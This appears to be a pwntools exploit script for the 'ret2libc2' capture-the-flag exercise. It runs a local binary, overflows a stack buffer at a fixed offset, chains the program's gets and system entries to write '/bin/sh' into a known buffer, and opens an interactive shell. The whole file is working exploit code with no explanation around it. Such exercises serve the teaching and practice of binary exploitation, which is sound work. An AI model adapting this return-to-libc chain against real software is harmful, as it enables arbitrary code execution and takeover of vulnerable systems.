from pwn import *
p=process('./ret2libc2')
context(arch='i386',os='linux',log_level='debug')
elf=ELF('./ret2libc2')

sys_addr=elf.plt['system']
gets_addr=elf.plt['gets']
buf2_addr=0x0804A080

payload=flat([cyclic(0x6c+4),gets_addr,sys_addr,buf2_addr,buf2_addr])

p.recv()
p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()